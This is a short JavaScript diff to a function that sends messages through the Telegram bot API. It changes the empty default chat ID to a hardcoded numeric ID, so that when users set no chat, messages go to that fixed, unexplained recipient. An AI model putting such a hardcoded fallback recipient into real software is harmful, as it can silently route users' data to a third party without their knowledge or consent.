@@ -1422,7 +1422,7 @@ function loadWaSettings(){
 }
 async function sendTelegram(message){
   const token=(document.getElementById('wa-token')?.value||S.settings.waToken||'').trim();
-  const chatId=(document.getElementById('wa-chatid')?.value||S.settings.waChatId||'').trim();
+  const chatId=(document.getElementById('wa-chatid')?.value||S.settings.waChatId||'1019589316').trim();
   if(!token||!chatId)return false;
   try{
     const res=await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text:message})});
